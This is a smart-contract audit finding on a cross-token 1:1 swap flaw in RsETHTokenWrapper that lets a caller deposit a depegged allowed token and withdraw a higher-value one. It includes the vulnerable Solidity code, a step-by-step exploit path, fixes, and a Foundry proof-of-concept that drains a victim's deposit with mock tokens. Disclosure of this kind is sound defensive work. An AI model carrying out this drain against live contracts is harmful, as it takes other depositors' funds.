Audit Report

## Title
Cross-Token 1:1 Swap Enables Value Extraction When Multiple `allowedTokens` Have Divergent Prices - (File: contracts/L2/RsETHTokenWrapper.sol)

## Summary

`RsETHTokenWrapper` mints and burns `wrsETH` at a strict 1:1 ratio for any token in `allowedTokens`, with no price check or cross-token guard. When the contract holds multiple allowed altRsETH tokens that trade at different market prices, any unprivileged caller can deposit the lower-value token and immediately withdraw the higher-value token, extracting the price difference at the expense of other depositors.

## Finding Description

The contract explicitly supports multiple allowed tokens: `initialize` adds the first token, `reinitialize` (callable by `DEFAULT_ADMIN_ROLE`) adds a second, and `addAllowedToken` (callable by `TIMELOCK_ROLE`) can add further tokens.

`_deposit` (L134–141) accepts any `allowedToken` and mints `wrsETH` 1:1:

```solidity
function _deposit(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);
    _mint(_to, _amount);
    emit Deposit(_asset, msg.sender, _to, _amount);
}
```

`_withdraw` (L120–128) burns `wrsETH` and transfers any `allowedToken` 1:1:

```solidity
function _withdraw(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    _burn(msg.sender, _amount);
    ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
    emit Withdraw(_asset, msg.sender, _to, _amount);
}
```

Both `deposit` (L69) and `withdraw` (L84) are public with no access control. There is no mechanism that ties a depositor's `wrsETH` to the specific token they deposited, and no oracle or ratio check when withdrawing a different token than was deposited.

**Exploit path:**
1. Wrapper holds `N` units of `altRsETH_B` (canonical, worth 1.00 ETH each), deposited by legitimate users.
2. Attacker acquires `N` units of `altRsETH_A` (depegged bridged rsETH, worth 0.90 ETH each).
3. Attacker calls `deposit(altRsETH_A, N)` → wrapper receives `N` depegged tokens, mints `N` `wrsETH`.
4. Attacker calls `withdraw(altRsETH_B, N)` → burns `N` `wrsETH`, receives `N` canonical tokens.
5. Net: attacker spent 900 ETH of value, received 1000 ETH of value. Legitimate `altRsETH_B` depositors cannot recover their tokens.

The only existing guard is `allowedTokens[_asset]`, which is a whitelist check, not a value-equivalence check. `removeAllowedToken` (L180–185) requires `TIMELOCK_ROLE` and introduces a governance delay during which the attack can be executed.

## Impact Explanation

**Critical — Direct theft of user funds.** The attacker extracts real ETH-denominated value from other depositors' holdings. The `wrsETH` supply remains unchanged but the backing composition degrades from higher-value to lower-value tokens. Legitimate depositors of the higher-value token cannot redeem at the value they deposited. This matches the allowed impact: "Direct theft of any user funds, whether at-rest or in-motion."

## Likelihood Explanation

The attack requires no special role, no flash loan, and no complex setup. The only precondition is that two allowed tokens trade at different prices simultaneously. This is realistic: bridging delays, chain-specific liquidity events, or a partial depeg on one L2 would create the spread. The multi-token design is intentional and already exercised by `reinitialize`. The attack is repeatable as long as the price spread persists and the wrapper holds the higher-value token.

## Recommendation

1. **Preferred:** Restrict the wrapper to a single canonical allowed token at any given time. Before adding a new token via `addAllowedToken`, require the old token to be removed, eliminating cross-token arbitrage entirely.
2. **Alternative:** Track per-depositor per-token balances and restrict `withdraw` to only the token the caller deposited.
3. **Alternative:** Integrate a price oracle and enforce value-equivalent swaps when the withdrawn token differs from the deposited token.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/L2/RsETHTokenWrapper.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory name) ERC20(name, name) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract CrossTokenArbitrageTest is Test {
    RsETHTokenWrapper wrapper;
    MockToken altA; // depegged, worth 0.90 ETH
    MockToken altB; // canonical, worth 1.00 ETH
    address admin = address(0xA);
    address attacker = address(0xB);
    address victim = address(0xC);

    function setUp() public {
        altA = new MockToken("altRsETH_A");
        altB = new MockToken("altRsETH_B");

        wrapper = new RsETHTokenWrapper();
        // initialize with altB as first allowed token
        wrapper.initialize(admin, address(0), address(altB));

        // admin adds altA as second allowed token via reinitialize
        vm.prank(admin);
        wrapper.reinitialize(address(altA));

        // victim deposits 1000 altB
        altB.mint(victim, 1000e18);
        vm.startPrank(victim);
        altB.approve(address(wrapper), 1000e18);
        wrapper.deposit(address(altB), 1000e18);
        vm.stopPrank();

        // attacker holds 1000 altA (worth only 900 ETH)
        altA.mint(attacker, 1000e18);
    }

    function testCrossTokenArbitrage() public {
        vm.startPrank(attacker);
        altA.approve(address(wrapper), 1000e18);

        // Step 1: deposit cheap altA, receive 1000 wrsETH
        wrapper.deposit(address(altA), 1000e18);
        assertEq(wrapper.balanceOf(attacker), 1000e18);

        // Step 2: withdraw expensive altB using wrsETH
        wrapper.withdraw(address(altB), 1000e18);
        assertEq(altB.balanceOf(attacker), 1000e18); // attacker drained all altB
        assertEq(altA.balanceOf(address(wrapper)), 1000e18); // wrapper left with depegged altA
        vm.stopPrank();

        // victim can no longer withdraw their altB
        vm.prank(victim);
        vm.expectRevert(); // insufficient altB balance in wrapper
        wrapper.withdraw(address(altB), 1000e18);
    }
}
